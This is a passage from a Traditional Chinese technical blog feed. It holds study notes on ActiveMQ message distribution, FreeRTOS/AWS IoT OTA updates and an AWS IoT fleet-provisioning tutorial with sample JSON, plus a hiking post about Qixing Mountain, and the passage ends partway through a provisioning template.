的兩個消費者也訂閱 <code>Q.TEST</code>，所以這裡有三個消費者，並且假設所有消費者具有相等的優先級。</p><p>然後，在代理 A 上啟動一個生產者，將 30 條消息寫入 <code>Q.TEST</code>。默認情況下（<code>conduitSubscriptions=true</code>），將有 15 條消息發送到代理 A 上的消費者，其餘的 15 條消息將發送到代理 B 上的兩個消費者。</p><p><strong>但也由於預設狀況下，代理 A 將代理 B 上的兩個訂閱視為一個，消息負載並未均勻分佈在所有三個消費者之間。</strong></p><p>但如果你將 <code>conduitSubscriptions</code> 設置為 <code>false</code>，那麼三個消費者中的每個將分配到 10 條消息。</p><h2 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h2><p>[+] 執行個體類型 - <a href="https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html">https://docs.aws.amazon.com/zh_tw/amazon-mq/latest/developer-guide/broker-instance-types.html</a><br>[+] Amazon MQ 代理网络 - 代理网络的工作原理是什么？ - <a href="https://docs.aws.amazon.com/zh_cn/amazon-mq/latest/developer-guide/network-of-brokers.html#how-does-it-work">https://docs.aws.amazon.com/zh_cn/amazon-mq/latest/developer-guide/network-of-brokers.html#how-does-it-work</a><br>[+]ActiveMQ - NetworkConnectors - <a href="https://activemq.apache.org/networks-of-brokers">https://activemq.apache.org/networks-of-brokers</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> ActiveMQ </tag>
            
            <tag> MQ </tag>
            
            <tag> Scaling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【學習筆記】OTA Update -1</title>
      <link href="/posts/613d9ed0.html"/>
      <url>/posts/613d9ed0.html</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-OTA-Update-Over-The-Air-Updtae"><a href="#什麼是-OTA-Update-Over-The-Air-Updtae" class="headerlink" title="什麼是 OTA Update (Over The Air Updtae)?"></a>什麼是 OTA Update (Over The Air Updtae)?</h2><p>透過無線通訊去對設備進行軟體&#x2F;韌體更新</p><h2 id="OTA-的流程"><a href="#OTA-的流程" class="headerlink" title="OTA 的流程"></a>OTA 的流程</h2><ul><li>Notify<ul><li>設備會被通知有擱置的OTA更新</li><li>設備可以選擇忽略更新或者接受更新以觸發下載</li></ul></li><li>Download<ul><li>設備通過各種支援的協定進行更新下載</li><li>更新包會下載到預先設定好的儲存區域<ul><li>Ex. S3 Bucket</li></ul></li><li>更新可能是全新的韌體映像或現有韌體的補丁</li></ul></li><li>Verify<ul><li>驗證更新包的有效性</li></ul></li><li>Install<ul><li>設備通過更新包開始更新（通常是通過 bootloader）成最新的韌體</li><li>安裝後可以執行檢查以驗證功能</li><li>設備將向 OTA 更新提供者報告韌體更新成功</li></ul></li></ul><p>主要分成這四個步驟</p><h2 id="模組化-OTA-更新"><a href="#模組化-OTA-更新" class="headerlink" title="模組化 OTA 更新"></a>模組化 OTA 更新</h2><ul><li>模組化 OTA 由幾個小型函式庫和一個協調器(Orchestrator)組成。</li><li>每個 Lib 負責特定的子任務，例如通知待處理的 OTA 更新或透過 MQTT 下載檔案</li><li>編排器將所有小型程式庫與bootloader 和 Memory Pool 同步以執行 OTA 更新。</li></ul><p>模組化 OTA 方法可讓您根據需求的變化更換或更改 OTA 的不同部分。例如：</p><ol><li>如果您想從 AWS IoT 觸發 OTA，則可以使用 IoT Job Lib檢查新的 OTA 更新或傳送有關 OTA Jobs 狀態的通知。或者，您可以將其替換為任何其他其他的程式庫。</li><li>可以使用IoT Job Lib 中的 <strong>OTA Job Parser</strong> 來解析接收到的OTAJob Document。或者，您可以根據 OTA Job Document 使用自己自訂的 Job Document Parser。</li></ol><h2 id="模組化-OTA-更新流程"><a href="#模組化-OTA-更新流程" class="headerlink" title="模組化 OTA 更新流程"></a>模組化 OTA 更新流程</h2><p>以下是根據 FreeRTOS 官網提供的模組化 OTA更新的流程</p><p><img src="https://hackmd.io/_uploads/Sk_CRjSB6.png" alt="image"></p><h2 id="協調器（Orchestrator）"><a href="#協調器（Orchestrator）" class="headerlink" title="協調器（Orchestrator）"></a>協調器（Orchestrator）</h2><ul><li>Orchestrator 是指定如何協調 OTA 更新的核心元件</li><li>Orchestrator 由使用者提供，並包含所需數量的自訂元件，以完成所需的 OTA 更新方法</li><li>典型的更新將包含「通知」、「下載」、「驗證」和「安裝」階段。 </li><li>Orchestrator 將透過將元件函式庫和其他外部函式庫拼接在一起來提供這些階段</li><li>每個元件函式庫的描述可以在下面找到</li></ul><h2 id="IoT-Job-Libraries"><a href="#IoT-Job-Libraries" class="headerlink" title="IoT Job Libraries"></a>IoT Job Libraries</h2><ul><li>IoT Job Handler 會是整個 OTA Flow 當中第一個使用到的元件</li><li>這個函式庫提供了啟動待處理的 IoT 作業以及更新作業狀態的功能</li><li>當作業處理程序獲悉新的 OTA 更新（透過 IoT Job 進行）時，處理程序將啟動 Job 並將 Job 及其 metadata 傳遞到解析器鏈</li><li>如果設定了解析器來處理該 Job ，它將向 Job Handler 轉送 Job 已成功啟動的資訊</li><li>此成功啟動通知將轉發回 OTA 更新提供者（即 IoT Jobs），以將更新標記為已啟動。如果沒有解析器能夠理解該作業，則啟動 OTA 更新的失敗將轉發給提供者</li></ul><h2 id="OTA-Job-Parser"><a href="#OTA-Job-Parser" class="headerlink" title="OTA Job Parser"></a>OTA Job Parser</h2><p>解析器將驗證 IoT 作業是否為 OTA 更新，並在呼叫下載器之前將欄位解析為可用格式</p><h2 id="MQTT-file-streaming-library"><a href="#MQTT-file-streaming-library" class="headerlink" title="MQTT file streaming library"></a>MQTT file streaming library</h2><ul><li>文件下載器提供下載 OTA 檔案的功能。檔案下載器透過 CBOR 或 JSON 格式的 MQTT Stream 處理下載更新</li><li>下載本身是在 Chunk 上執行的，這更容易被視為整個 OTA 更新檔案的區塊。這樣做是為了提高下載的可靠性，並允許比單一下載「區塊」中可能進行的更大的韌體更新。</li></ul><h2 id="Bootloader-and-Signature-Verifier"><a href="#Bootloader-and-Signature-Verifier" class="headerlink" title="Bootloader and Signature Verifier"></a>Bootloader and Signature Verifier</h2><ul><li>bootloader 的存在是為了驗證新韌體並將其安裝到裝置上</li><li>模組化 OTA 刻意避免實施 bootloader，因為已經存在適用於大量受支援微控制器的多個行業範圍的 bootloader</li><li>模組化 OTA 將 bootloader和簽章驗證機制的選擇留給使用者。</li></ul><h2 id="AWS-IoT-Jobs-以及-AWS-IoT-OTA-Update差異"><a href="#AWS-IoT-Jobs-以及-AWS-IoT-OTA-Update差異" class="headerlink" title="AWS IoT Jobs 以及 AWS IoT OTA Update差異"></a>AWS IoT Jobs 以及 AWS IoT OTA Update差異</h2><ul><li>AWS IoT Jobs<ul><li>定義一組可以發送到一個或多個設備並在其上運行的遠端操作</li><li>最常見的是，作業用於執行軟體或韌體更新，但也可用於執行任何任意操作，例如重新啟動、憑證 Rotate等</li></ul></li><li>AWS IoT OTA Update<ul><li>基於 AWS IoT Jobs 建置的功能，專門實現軟體&#x2F;韌體更新操作，並且僅實現該操作</li><li>OTA 更新是一項 Job，<strong>但有預先定義的 Job文件</strong>。它捆綁了常見的軟體更新功能（例如程式碼簽署），可以能夠更快建立軟體更新解決方案</li></ul></li></ul><p>比較表格</p><table><thead><tr><th></th><th>AWS IoT Jobs</th><th>AWS IoT OTA Updates</th></tr></thead><tbody><tr><td>用途</td><td>任何自定義的行為</td><td>FreeRTOS OTA update</td></tr><tr><td>Job 文件</td><td>可自定義</td><td>預先定義</td></tr><tr><td>建立的 API</td><td>CreateJob</td><td>CreateOTAUpdate</td></tr><tr><td>程式碼簽署</td><td>需使用者自行實踐</td><td>已整合</td></tr><tr><td>HTTP&#x2F;MQTT</td><td>需使用者自行選擇</td><td>已整合</td></tr><tr><td>支援AWS IoT Device SDK</td><td>C, C++, Python, Java, Javascript</td><td>僅有 C</td></tr><tr><td>Platform Abstraction Layer (PAL)</td><td>無</td><td>有 [3]</td></tr><tr><td>Max 檔案限制</td><td>HTTP: <strong>5GB (Amazon S3 limit)</strong>, MQTT: <strong>24MB (MQTT file stream limit)</strong></td><td>16MB (OTA update limit)[4]</td></tr></tbody></table><h2 id="AWS-IoT-Over-The-Air-OTA-Library"><a href="#AWS-IoT-Over-The-Air-OTA-Library" class="headerlink" title="AWS IoT Over-The-Air (OTA) Library"></a>AWS IoT Over-The-Air (OTA) Library</h2><blockquote><p><a href="https://github.com/aws/ota-for-aws-iot-embedded-sdk">https://github.com/aws/ota-for-aws-iot-embedded-sdk</a></p></blockquote><p>這個AWS函式庫同時包含了，FreeRTOS 以及 AWS IoT Device SDK for Embedded-C</p><p>這個函式庫同時包含了<strong>OTA Platform Abstration Layer (PAL)</strong> [3] 來去簡化將函式庫遷移到特定硬體的難度 [5]。</p><p>也有  OTA Operating System (OS) Functional Interface 來去簡化移植到 FreeRTOS 以外的 RTOS 甚至是裸機的困難度。</p><blockquote><p>由於 AWS IoT OTA 適用於資源受限的設備，因此在原生的Device SDK 並沒有整合 FreeRTOS。出於同樣的原因，OTA 檔案大小限制為 16MB。</p></blockquote><h2 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h2><p>[1] <a href="https://www.freertos.org/freertos-core/over-the-air-updates/index.html">https://www.freertos.org/freertos-core/over-the-air-updates/index.html</a><br>[2] <a href="https://repost.aws/articles/ARDHNhV0bnRGau0kmdhTSZZA/comparing-aws-iot-jobs-and-aws-iot-over-the-air-ota-updates">https://repost.aws/articles/ARDHNhV0bnRGau0kmdhTSZZA/comparing-aws-iot-jobs-and-aws-iot-over-the-air-ota-updates</a><br>[3] <a href="https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_pal_interface.html">https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_pal_interface.html</a><br>[4] <a href="https://docs.aws.amazon.com/general/latest/gr/amazon-freertos.html#limits-ota-manager">https://docs.aws.amazon.com/general/latest/gr/amazon-freertos.html#limits-ota-manager</a><br>[5] Porting Guide - <a href="https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_porting.html">https://www.freertos.org/Documentation/api-ref/ota-for-aws-iot-embedded-sdk/docs/doxygen/output/html/ota_porting.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT </tag>
            
            <tag> OTA </tag>
            
            <tag> Firmware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【爬山紀錄】七星山主峰 + 東峰</title>
      <link href="/posts/22f14c54.html"/>
      <url>/posts/22f14c54.html</url>
      
        <content type="html"><![CDATA[<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><p>由於生長在台北多年還沒去七星山主峰的三角點，趁著難得的好天氣出遊踩點</p><p>這次爬七星山的主要路線是從 <strong>小油坑登山口</strong> -&gt; <strong>七星山主峰</strong> -&gt; <strong>七星山東峰</strong>，接著原路返回到 <strong>小油坑停車場</strong></p><p><img src="/img/mountain-1/161346.jpg"></p><p>七星山是台北市內最高的山，海拔達到 <code>1120</code> 公尺</p><h2 id="小油坑地熱口"><a href="#小油坑地熱口" class="headerlink" title="小油坑地熱口"></a>小油坑地熱口</h2><p>地熱口附近硫磺味很重，但天氣冷其實靠近挺暖的<br><img src="/img/mountain-1/m1.jpg"></p><p>湧出的硫磺泉會沸騰冒泡<br><img src="/img/mountain-1/m2.jpg"><br><img src="/img/mountain-1/m3.jpg"><br><img src="/img/mountain-1/m4.jpg"><br><img src="/img/mountain-1/m5.jpg"><br><img src="/img/mountain-1/m6.jpg"></p><h2 id="七星山主峰"><a href="#七星山主峰" class="headerlink" title="七星山主峰"></a>七星山主峰</h2><p>通往主峰的路上幾乎都是石頭階梯，但階梯路途中挺多陡上，<strong>建議攜帶登山杖</strong></p><p><img src="/img/mountain-1/m13.jpg"><br><img src="/img/mountain-1/m8.jpg"></p><p>現在是11月的芒草季，但這裡風大，芒草都被吹得彎曲，但景色還是挺美</p><p><img src="/img/mountain-1/m7.jpg"><br><img src="/img/mountain-1/m10.jpg"></p><p>假日會很多登山客要來跟這根拍照，就自行考量要不要留個紀念了<br><img src="/img/mountain-1/m9.jpg"></p><h2 id="七星山東峰"><a href="#七星山東峰" class="headerlink" title="七星山東峰"></a>七星山東峰</h2><p>主峰往東峰的路段只需再走 <code>0.3K</code>，可以選擇一次蒐集兩個峰頂。但從七星主峰到七星東峰的部分路段較為濕滑，建議穿有防滑的登山鞋來。</p><h2 id="草叢"><a href="#草叢" class="headerlink" title="草叢"></a>草叢</h2><p>順帶一提，一路上都有很多像是下面這樣，人可以通過的樹叢，如果透過離線地圖看是可以發現路的，而且也能發現有綁繩子，舊友進去稍微探險一下，但由於後面泥濘太多，就沒有深入往下探下去了</p><p><img src="/img/mountain-1/m11.jpg"><br><img src="/img/mountain-1/m12.jpg"><br><img src="/img/mountain-1/m14.jpg"></p><p>東峰的景色個人覺得還好，但也是多人跟著合照。</p><p><img src="/img/mountain-1/m15.jpg"></p><p>之後就原路返回停車場，結束今天的旅程了</p><blockquote><p>其實大多數人都會從小油坑上去到主峰再到東峰，再從冷水坑下去或是反向路線，但由於有開車就只能原路來回拉</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 爬山健行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 北部 </tag>
            
            <tag> 小百岳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>機群佈建(Fleet Provisioning) - 預先佈建裝置到 AWS IoT</title>
      <link href="/posts/889a40ef.html"/>
      <url>/posts/889a40ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h2><h2 id="什麼是機群佈建-Fleet-Provisioning"><a href="#什麼是機群佈建-Fleet-Provisioning" class="headerlink" title="什麼是機群佈建(Fleet Provisioning)?"></a>什麼是機群佈建(Fleet Provisioning)?</h2><p>機群佈建當中也有分成 <strong>要求佈建 （Provisioning by Claim）</strong> 還有 <strong>透過信任的使用者佈建 （Provisioning by Trusted User）</strong></p><h3 id="要求佈建"><a href="#要求佈建" class="headerlink" title="要求佈建"></a>要求佈建</h3><p>裝置可以使用內嵌的佈建宣告憑證（Claim Certificate）(這是特殊用途的憑證) 和私有金鑰  來製造。如果這些憑證已向 AWS IoT 註冊，該服務可以將它們交換為裝置可用於一般操作的唯一裝置憑證。</p><h3 id="透過信任的使用者佈建"><a href="#透過信任的使用者佈建" class="headerlink" title="透過信任的使用者佈建"></a>透過信任的使用者佈建</h3><p>在許多情況下，如終端使用者或安裝技術人員等信任的使用者初次使用行動應用程式在其部署的位置設定裝置時，裝置會連線至 AWS IoT</p><blockquote><p>在本篇文章中，主要會介紹透過 <strong>要求佈建</strong> 的方式來去進行機群佈建</p></blockquote><h2 id="要求佈建的流程"><a href="#要求佈建的流程" class="headerlink" title="要求佈建的流程"></a>要求佈建的流程</h2><p><img src="https://i.imgur.com/5UPLkKJ.png" alt="Imgur"></p><h2 id="設置-AWS-IoT-Core"><a href="#設置-AWS-IoT-Core" class="headerlink" title="設置 - AWS IoT Core"></a>設置 - AWS IoT Core</h2><h3 id="建立憑證以及公私鑰對"><a href="#建立憑證以及公私鑰對" class="headerlink" title="建立憑證以及公私鑰對"></a>建立憑證以及公私鑰對</h3><p>產生用於佈建的憑證。</p><ul><li>可以在 AWS IoT Console 上的 <strong>Secure</strong> &gt;&gt; <strong>Certificates</strong> &gt;&gt; <strong>Add Certificates</strong> &gt;&gt; <strong>Create Certificates</strong></li></ul><p><img src="https://i.imgur.com/ay2zm5V.png" alt="Imgur"><br><img src="https://i.imgur.com/Qnr2Olh.png" alt="Imgur"></p><ul><li>接著會跳出對應的畫面，會需要去下載憑證跟私鑰到本地端，另外為了方便也請將 Root CA 憑證下載到本地</li></ul><p><img src="https://i.imgur.com/kRUAGF9.png" alt="Imgur"></p><h3 id="建立-Provisioning-Template-並且附加-Policy"><a href="#建立-Provisioning-Template-並且附加-Policy" class="headerlink" title="建立 Provisioning Template 並且附加 Policy"></a>建立 Provisioning Template 並且附加 Policy</h3><ul><li>建立 Provisioning Template</li></ul><p><img src="https://i.imgur.com/cG83JRG.png" alt="Imgur"></p><ul><li>選擇 <strong>Provisioning deivces with claim certificates</strong>，之後點選 <strong>Nexts</strong></li></ul><p><img src="https://i.imgur.com/7baFaol.png" alt="Imgur"></p><ul><li>建立給 IoT Service 的 Role，點選 <strong>Create Role</strong></li><li>輸入完畢 Role Name 後點選 <strong>View</strong></li></ul><p><img src="https://i.imgur.com/6bZNMWr.png" alt="Imgur"></p><ul><li>Attach policy</li><li>請搜尋並附加 AWS 管理的 Policy <code>AWSIoTThingsRegistration</code></li></ul><p><img src="https://i.imgur.com/MwkIdA0.png" alt="Imgur"><br><img src="https://i.imgur.com/YW2Nfdh.png" alt="Imgur"></p><ul><li>Claim certificate policy，點選 <strong>Create IoT  Policy</strong></li></ul><p><img src="https://i.imgur.com/21XORly.png" alt="Imgur"></p><ul><li>填入 Policy Name 之後貼上範例 JSON</li></ul><p><img src="https://i.imgur.com/mNKS8IC.png" alt="Imgur"></p><p>範例 IoT Policy</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Connect&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;iot:Publish&quot;</span><span class="punctuation">,</span><span class="string">&quot;iot:Receive&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topic/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iot:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/certificates/create/*&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;arn:aws:iot:aws-region:aws-account-id:topicfilter/$aws/provisioning-templates/templateName/provision/*&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hzebj7r.png" alt="Imgur"></p><ul><li>勾選憑證</li></ul><p><img src="https://i.imgur.com/5y8PAPu.png" alt="Imgur"></p><p>完成後就可以來設定預佈建</p><h3 id="設定預先佈建"><a href="#設定預先佈建" class="headerlink" title="設定預先佈建"></a>設定預先佈建</h3><p>機群佈建的範本範例</p><blockquote><p><a href="https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-template.html#fleet-provisioning-example">https://docs.aws.amazon.com/zh_tw/iot/latest/developerguide/provision-template.html#fleet-provisioning-example</a></p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Parameters&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SerialNumber&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DeviceLocation&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;String&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;LocationTable&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Seattle&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;LocationUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://example.aws&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resources&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;thing&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Thing&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">                    <span class="attr">&quot;version&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;v1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;serialNumber&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;serialNumber&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;ThingName&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Fn::Join&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="punctuation">[</span><span class="string">&quot;ThingPrefix_&quot;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span><span class="string">&quot;SerialNumber&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;v1-lightbulbs&quot;</span><span class="punctuation">,</span> <span class="string">&quot;WA&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;BillingGroup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LightBulbBillingGroup&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;OverrideSettings&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AttributePayload&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;MERGE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingTypeName&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;REPLACE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;ThingGroups&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;DO_NOTHING&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;certificate&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;CertificateId&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;Ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Certificate::Id&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;Status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Active&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;policy&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;AWS::IoT::Policy&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Properties&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;PolicyDocument&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span 